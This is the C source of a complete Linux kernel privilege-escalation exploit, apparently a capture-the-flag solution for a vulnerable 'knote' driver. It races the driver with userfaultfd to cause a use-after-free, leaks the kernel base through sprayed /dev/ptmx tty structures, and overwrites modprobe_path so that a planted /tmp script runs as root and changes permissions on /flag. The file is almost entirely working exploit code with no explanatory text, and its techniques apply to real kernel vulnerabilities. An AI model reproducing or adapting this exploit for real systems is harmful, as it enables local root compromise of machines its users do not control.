/*************************************************************
 * File Name: exp.c
 * 
 * Created on: 2019-11-22 23:55:34
 * Author: raycp
 * 
 * Last Modified: 2019-11-24 03:48:52
 * Description: double fetch with userfaultfd to solve knote 
************************************************************/
#include<stdio.h>
#include <inttypes.h>
#include <sys/ioctl.h>
#include <fcntl.h>
#include <linux/userfaultfd.h>
#include <pthread.h>
#include <poll.h>
#include <assert.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>


#define DEV_NAME "/dev/knote"

#define SPRAY_COUNT 1

#define ADD_NOTE 0x1337
#define EDIT_NOTE 0x8888
#define DELE_NOTE 0x6666
#define GET_NOTE 0x2333

#define do_SAK_work_offset 0x5d4ef0
#define modprobe_path_offset 0x145c5c0

int fd;
union size_id
{
    uint32_t id;
    uint32_t size;
};

struct chunk
{
    union size_id sid;
    uint32_t pad;
    uint64_t data_ptr;
};

static int page_size;

uint64_t fault_page;
uint64_t fault_page_len;

uint64_t heap_addr;
uint64_t kernel_base;
uint64_t modprobe_path;
int ptmx_fd[SPRAY_COUNT];

void die(const char* msg) 
{
    perror(msg);
    _exit(-1);
}

void add(uint32_t size)
{
    struct chunk mychunk;
    mychunk.sid.size = size;

    ioctl(fd, ADD_NOTE, &mychunk);

    return ;
}

void get(uint32_t idx, void* data_ptr)
{
    struct chunk mychunk;

    mychunk.sid.id = idx;
    mychunk.data_ptr = (uint64_t)data_ptr;

    ioctl(fd, GET_NOTE, &mychunk);

    return ;
}

void edit(uint32_t idx, void* data_ptr)
{
    struct chunk mychunk;

    mychunk.sid.id = idx;
    mychunk.data_ptr = (uint64_t)data_ptr;

    ioctl(fd, EDIT_NOTE, &mychunk);

    return ;
}

void dele(uint32_t idx)
{
    struct chunk mychunk;

    mychunk.sid.id = idx;

    ioctl(fd, DELE_NOTE, &mychunk);

    return ;
}

void get_root(uint32_t i)
{
    while(1) {
        sleep(1);
        if (getuid() == 0) {
            printf("root at thread: %d\n",i);
			execl("/bin/sh", "sh", NULL);
            _exit(0);
        }
    }
}

static void *
race_read_fault_handler_thread(void *arg)
{
    static struct uffd_msg msg;   /* Data read from userfaultfd */
    long uffd;                    /* userfaultfd file descriptor */
    static char *page = NULL;
    struct uffdio_copy uffdio_copy;
    size_t nread;
    uint32_t i;

    uffd = (long) arg;

    // sleep 3 senconds here to wait anathor thread deletes this chunk.
    printf("[+] race read: sleep to wait to delete...\n");
    sleep(3);

    /* Create a page that will be copied into the faulting region */
    if (page == NULL) {
        page = (char*)mmap(NULL, page_size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
        if (page == MAP_FAILED)
            die("mmap");
    }

    /* See what poll() tells us about the userfaultfd */
    struct pollfd pollfd;
    int nready;
    pollfd.fd = uffd;
    pollfd.events = POLLIN;
    nready = poll(&pollfd, 1, -1);
    if (nready == -1)
        die("poll");

    /* Read an event from the userfaultfd */
    nread = read(uffd, &msg, sizeof(msg));
    if (nread == 0) {
        die("EOF on userfaultfd");
    }

    if (nread == -1)
        die("read");

    /* We expect only one kind of event; verify that assumption */
    assert(msg.event == UFFD_EVENT_PAGEFAULT);

    printf("fault page address = %llx\n", msg.arg.pagefault.address);

    /* Copy the page pointed to by 'page' into the faulting region.*/
    memset(page, 'A', page_size);

    uffdio_copy.src = (unsigned long) page;

    /* We need to handle page faults in units of pages(!).
     * So, round faulting address down to page boundary */
    uffdio_copy.dst = (unsigned long) msg.arg.pagefault.address & ~(page_size - 1);
    uffdio_copy.len = page_size;
    uffdio_copy.mode = 0;
    uffdio_copy.copy = 0;
    if (ioctl(uffd, UFFDIO_COPY, &uffdio_copy) == -1)
        die("ioctl-UFFDIO_COPY");

}

void race_read_register_userfault()
{

   long uffd;          /* userfaultfd file descriptor */
   struct uffdio_api uffdio_api;
   struct uffdio_register uffdio_register;
   pthread_t thr;      /* ID of thread that handles page faults */
   int s, i;


   /* Create and enable userfaultfd object */
   uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
   if (uffd == -1)
	   die("userfaultfd");

   uffdio_api.api = UFFD_API;
   uffdio_api.features = 0;
   if (ioctl(uffd, UFFDIO_API, &uffdio_api) == -1)
	   die("ioctl-UFFDIO_API");

   /* Register the memory range of the mapping we just created for
	  handling by the userfaultfd object. In mode, we request to track
	  missing pages (i.e., pages that have not yet been faulted in). */
   uffdio_register.range.start = fault_page;
   uffdio_register.range.len = fault_page_len;
   uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;
   if (ioctl(uffd, UFFDIO_REGISTER, &uffdio_register) == -1)
	   die("ioctl-UFFDIO_REGISTER");

   /* Create a thread that will process the userfaultfd events */
   s = pthread_create(&thr, NULL, race_read_fault_handler_thread, (void *) uffd);

   if (s != 0) {
       die("pthread_create");
   }
}


static void *
race_write_fault_handler_thread(void *arg)
{
    static struct uffd_msg msg;   /* Data read from userfaultfd */
    long uffd;                    /* userfaultfd file descriptor */
    static char *page = NULL;
    struct uffdio_copy uffdio_copy;
    size_t nread;
    uint32_t i;
    uint64_t *uint_ptr;

    uffd = (long) arg;

    // sleep 6 senconds here to wait anathor thread deletes this chunk.
    printf("[+] race write: sleep to wait to delete...\n");
    sleep(6);
    /* Create a page that will be copied into the faulting region */
    if (page == NULL) {
        page = (char*)mmap(NULL, page_size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
        if (page == MAP_FAILED)
            die("mmap");
    }

    /* See what poll() tells us about the userfaultfd */
    struct pollfd pollfd;
    int nready;
    pollfd.fd = uffd;
    pollfd.events = POLLIN;
    nready = poll(&pollfd, 1, -1);
    if (nready == -1)
        die("poll");

    /* Read an event from the userfaultfd */
    nread = read(uffd, &msg, sizeof(msg));
    if (nread == 0) {
        die("EOF on userfaultfd");
    }    

    if (nread == -1)
        die("read");

    /* We expect only one kind of event; verify that assumption */
    assert(msg.event == UFFD_EVENT_PAGEFAULT);

    printf("fault page address = %llx\n", msg.arg.pagefault.address);

    /* Copy the page pointed to by 'page' into the faulting region.*/
    memset(page, 0, page_size);

    // ***** key here ***** //
    uint_ptr = (uint64_t *)page;
    uint_ptr[0] = modprobe_path;// key here change fd to modprobe_path

    uffdio_copy.src = (unsigned long) page;

    /* We need to handle page faults in units of pages(!).
      So, round faulting address down to page boundary */
    uffdio_copy.dst = (unsigned long) msg.arg.pagefault.address & ~(page_size - 1);
    uffdio_copy.len = page_size;
    uffdio_copy.mode = 0;
    uffdio_copy.copy = 0;
    if (ioctl(uffd, UFFDIO_COPY, &uffdio_copy) == -1)
        die("ioctl-UFFDIO_COPY");
}

void race_write_register_userfault()
{

   long uffd;          /* userfaultfd file descriptor */
   struct uffdio_api uffdio_api;
   struct uffdio_register uffdio_register;
   pthread_t thr;      /* ID of thread that handles page faults */
   int s;


   /* Create and enable userfaultfd object */
   uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
   if (uffd == -1)
	   die("userfaultfd");

   uffdio_api.api = UFFD_API;
   uffdio_api.features = 0;
   if (ioctl(uffd, UFFDIO_API, &uffdio_api) == -1)
	   die("ioctl-UFFDIO_API");

   /* Register the memory range of the mapping we just created for
	  handling by the userfaultfd object. In mode, we request to track
	  missing pages (i.e., pages that have not yet been faulted in). */
   uffdio_register.range.start = fault_page;
   uffdio_register.range.len = fault_page_len;
   uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;
   if (ioctl(uffd, UFFDIO_REGISTER, &uffdio_register) == -1)
	   die("ioctl-UFFDIO_REGISTER");

   /* Create a thread that will process the userfaultfd events */
   s = pthread_create(&thr, NULL, race_write_fault_handler_thread, (void *) uffd);
   if (s != 0) {
       die("pthread_create");
   }
}

void race_leak_heap()
{
    uint32_t size, i;
    char *user_data;
    uint64_t * uint_ptr;

    // add chunk first
    size = 0x2e0;
    add(size);

    user_data = (char*)mmap(NULL, page_size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (user_data == MAP_FAILED)
        die("mmap");
    printf("Address returned by mmap() = %p\n", user_data);

    fault_page = (uint64_t)user_data;
    fault_page_len = page_size;

    // register the mmap memory
    race_read_register_userfault();

    if(fork()==0){
        // child process delete the chunk and fill it with ptmx tty_struct
        sleep(1); // wait father process triggering userfaultfd whith means the thread has go intofunction copy_user_generic_unrolled
        dele(0);
        for(i=0; i<SPRAY_COUNT; i++)
            ptmx_fd[i]= open("/dev/ptmx", O_RDWR);
        exit(0);
    }
    else{
        // fathre process go into copy_user_generic_unrolled and sleep in userfaultfd wait uaf in child process
        get(0, user_data);

        uint_ptr = (uint64_t*)user_data;
        if(uint_ptr[7]==0) {
            printf("[-] leak data error\n");
            munmap(user_data, page_size);
            for (i=0; i<SPRAY_COUNT; i++) {
                close(ptmx_fd[i]);
            }
            exit(0);
        }

        heap_addr = uint_ptr[7] - 0x38;
        kernel_base = uint_ptr[0x56] - do_SAK_work_offset;
        printf("[+] leak heap addr: 0x%lx\n", heap_addr);
        printf("[+] leak kernel base: 0x%lx\n", kernel_base);

        modprobe_path = kernel_base + modprobe_path_offset;

        for (i=0; i<SPRAY_COUNT; i++) {
            close(ptmx_fd[i]);
        }
        return ;
    }
}

void race_write_heap()
{
    uint32_t size, i;
    char *user_data;


    user_data = (char*)mmap(NULL, page_size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (user_data == MAP_FAILED)
        die("mmap");
    printf("Address returned by mmap() = %p\n", user_data);

    fault_page = (uint64_t)user_data;
    fault_page_len = page_size;
    // register mmap memory
    race_write_register_userfault();

    if(fork()==0){
        // child process delete the chunk
        sleep(1); // wait father process triggering userfaultfd whith means the thread has go intofunction copy_user_generic_unrolled
        dele(0);
        exit(0);
    }
    else { 
        // fathre process go into copy_user_generic_unrolled and sleep in userfaultfd wait uaf in child process and change the fd to modprobe_path
        edit(0, user_data);
    }


}
int main()
{

    uint32_t  size;
    char tmp_data[0x2e0];

    fd = open(DEV_NAME, O_RDWR);
    if(fd == -1)
        die("open dev error");

    page_size = 0x1000;

    // race_leak_heap to leak addr
    race_leak_heap();
    
    size = 0x100;
    add(size);
    // race_write_heap to change delete chunk's fd to modprobe_path
    race_write_heap();

    // malloc out modprobe_path in sencond chunk.
    add(size);
    add(size);
  
    system("mkdir tmp");

    char string[] = "/tmp/chmod.sh\x00";
    strncpy(tmp_data, string, strlen(string));
    edit(1, tmp_data); // edit modprobe_path to /tmp/chmod.sh
    system("echo -ne '#!/bin/sh\n/bin/chmod 777 /flag\n' > /tmp/chmod.sh");
    system("chmod +x /tmp/chmod.sh");
    system("echo -ne '\\xff\\xff\\xff\\xff' > /tmp/dummy");
    system("chmod +x /tmp/dummy");

    system("/tmp/dummy"); // trigger __request_module
    system("cat /flag");
    system("ls -al /flag");

    // sleep to avoid rebooting
    sleep(20);
    
    return 0;
}
